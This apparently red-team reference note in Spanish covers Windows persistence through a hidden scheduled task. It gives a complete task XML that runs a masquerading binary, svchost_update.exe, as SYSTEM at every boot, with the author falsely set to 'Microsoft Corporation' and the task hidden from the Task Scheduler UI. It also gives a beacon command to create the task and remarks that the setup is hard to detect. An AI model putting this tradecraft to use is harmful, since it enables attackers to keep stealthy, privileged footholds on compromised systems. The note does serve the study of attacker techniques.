---
title: Persistencia Avanzada — Scheduled Task (Boot Trigger)
tags: [persistence, scheduled-task, system-level]
---

# Scheduled Task — Nivel SYSTEM con BootTrigger

## XML de la tarea

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows System Maintenance</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\svchost_update.exe</Command>
    </Exec>
  </Actions>
</Task>
```

## Características

| Elemento | Valor | Descripción |
|----------|-------|-------------|
| `BootTrigger` | — | Arranca con el sistema |
| `S-1-5-18` | NT AUTHORITY\SYSTEM | Corre como SYSTEM |
| `Hidden=true` | — | No visible en Task Scheduler UI |
| `PT0S` | 0 segundos | Sin tiempo límite de ejecución |

## Crear la tarea

```
beacon> schtaskscreate \WindowsMaintenance XML CREATE
```

> [!important] Requiere privilegios de administrador. Una tarea SYSTEM + Boot + Hidden es difícil de detectar sin herramientas especializadas.
